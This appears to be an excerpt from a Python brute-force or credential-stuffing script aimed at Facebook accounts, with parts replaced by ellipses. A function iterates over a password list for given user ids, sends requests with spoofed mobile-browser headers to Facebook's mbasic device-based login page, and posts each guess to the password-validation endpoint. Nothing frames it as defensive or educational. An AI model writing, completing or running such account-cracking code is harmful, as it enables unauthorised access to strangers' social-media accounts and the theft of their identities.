...
def ffb(ids, names, passlist):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not/A)Brand";v="24", "Chromium";v="116", "Google Chrome";v="116"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': 'Android', 'sec-ch-prefers-color-scheme': 'light', 'upgrade-insecure-requests': '1', 'user-agent': ua,
            ...
            getlog = session.get(
                f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
            ...
            complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',
